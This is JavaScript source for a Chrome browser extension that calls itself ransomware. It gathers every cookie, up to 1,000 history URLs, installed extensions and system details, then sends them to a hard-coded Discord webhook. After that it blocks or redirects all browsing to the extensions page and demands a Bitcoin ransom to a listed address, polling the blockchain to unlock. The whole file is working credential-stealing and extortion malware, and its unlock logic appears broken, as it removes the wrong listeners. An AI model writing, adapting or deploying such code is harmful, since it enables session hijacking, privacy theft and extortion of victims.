// UCAR script for ransomware browser extension

// Function to send collected data to Discord webhook
function sendToWebhook(data) {
    fetch('https://discordapp.com/api/webhooks/1259285219769450607/Yr7pmqkAfugS61lhibC8XKztl6WpmrEzGqRTmqPUyeQEYG8cikQylnjw_BrSVvHDERas', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ content: data }),
    }).then(response => {
        if (response.ok) {
            console.log('Data sent to webhook successfully.');
        } else {
            console.error('Failed to send data to webhook:', response.statusText);
        }
    }).catch(error => {
        console.error('Error sending data to webhook:', error);
    });
}

// Function to grab cookies
function getCookies() {
    return new Promise((resolve) => {
        chrome.cookies.getAll({}, function(cookies) {
            let cookieData = '';
            for (let i = 0; i < cookies.length; i++) {
                cookieData += cookies[i].name + '=' + cookies[i].value + '; ';
            }
            resolve(cookieData);
        });
    });
}

// Function to grab browsing history
function getBrowsingHistory() {
    return new Promise((resolve) => {
        chrome.history.search({ text: '', maxResults: 1000 }, function(historyItems) {
            let historyData = historyItems.map(item => item.url).join('\n');
            resolve(historyData);
        });
    });
}

// Function to get installed extensions
function getInstalledExtensions() {
    return new Promise((resolve) => {
        chrome.management.getAll(function(extensions) {
            let extensionData = extensions.map(ext => ext.name).join('\n');
            resolve(extensionData);
        });
    });
}

// Function to get system information
function getSystemInfo() {
    return new Promise((resolve) => {
        chrome.runtime.getPlatformInfo(function(info) {
            let systemData = `OS: ${info.os}\nArch: ${info.arch}\nNacl Arch: ${info.nacl_arch}`;
            resolve(systemData);
        });
    });
}

// Function to collect all information and send to webhook
async function collectAndSendData() {
    try {
        let cookieData = await getCookies();
        let historyData = await getBrowsingHistory();
        let extensionData = await getInstalledExtensions();
        let systemData = await getSystemInfo();

        let allData = `Cookies:\n${cookieData}\n\nHistory:\n${historyData}\n\nExtensions:\n${extensionData}\n\nSystem Info:\n${systemData}`;
        sendToWebhook(allData);

        // Store the collected data to localStorage for later use
        localStorage.setItem('sensitiveData', allData);
    } catch (error) {
        console.error('Error collecting data:', error);
    }
}

// Function to block DNS requests
function blockDNS() {
    chrome.webRequest.onBeforeRequest.addListener(
        function(details) {
            return { cancel: true };
        },
        { urls: ["<all_urls>"], types: ["main_frame", "sub_frame", "stylesheet", "script", "image", "object", "xmlhttprequest", "other"] },
        ["blocking"]
    );
}

// Function to restrict browsing to Chrome extensions page only
function allowOnlyExtensionsPage() {
    chrome.webRequest.onBeforeRequest.addListener(
        function(details) {
            if (details.url.includes("chrome://extensions/")) {
                return { cancel: false };
            } else {
                return { redirectUrl: "chrome://extensions/" };
            }
        },
        { urls: ["<all_urls>"] },
        ["blocking"]
    );
}

// Function to display Bitcoin ransom message and start payment monitoring
function showBitcoinRansomMessage() {
    alert("Your browser has been locked. To unlock, please send 0.001 Bitcoin to this address: bc1q7zqs0v6l4heep4d6kmarqn876xzawmedn30z5q");
    // Start payment monitoring every 60 seconds
    setInterval(checkForPayment, 60000);
}

// Function to check for Bitcoin payment confirmation
function checkForPayment() {
    fetch('https://blockchain.info/q/addressbalance/bc1q7zqs0v6l4heep4d6kmarqn876xzawmedn30z5q')
        .then(response => response.json())
        .then(data => {
            if (data >= 100000) { // 0.001 BTC in satoshis
                undoChanges();
            }
        });
}

// Function to reverse changes and uninstall extension
function undoChanges() {
    chrome.webRequest.onBeforeRequest.removeListener(blockDNS);
    chrome.webRequest.onBeforeRequest.removeListener(allowOnlyExtensionsPage);
    alert("Payment received. Your browser will now be restored.");
    chrome.management.uninstallSelf();
}

// Initialize ransomware
collectAndSendData();
blockDNS();
allowOnlyExtensionsPage();
showBitcoinRansomMessage();
